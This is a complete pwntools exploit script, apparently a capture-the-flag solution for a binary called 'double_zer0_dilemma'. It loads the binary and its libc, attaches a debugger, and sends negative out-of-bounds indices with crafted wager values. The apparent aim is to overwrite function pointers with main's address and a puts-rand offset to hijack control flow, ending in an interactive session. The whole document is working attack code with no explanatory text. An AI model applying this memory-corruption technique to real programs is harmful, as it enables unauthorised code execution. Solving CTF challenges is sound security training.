from pwn import *

exe = ELF("./double_zer0_dilemma")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

p = process("./double_zer0_dilemma")
gdb.attach(p)

double_for_main = 265368770
puts_rand_offset = libc.sym["puts"] - libc.sym["rand"]

log.info("puts-rand offset: " + str(hex(puts_rand_offset)))

p.recvuntil(b"land on:")
p.sendline(b"-24")
p.recvuntil(b"wager:")
p.sendline(f"{str(double_for_main)}".encode())

p.recvuntil(b"land on:")
p.sendline(b"-19")
p.recvuntil(b"wager:")
p.sendline(f"{str(puts_rand_offset)}".encode())

p.interactive()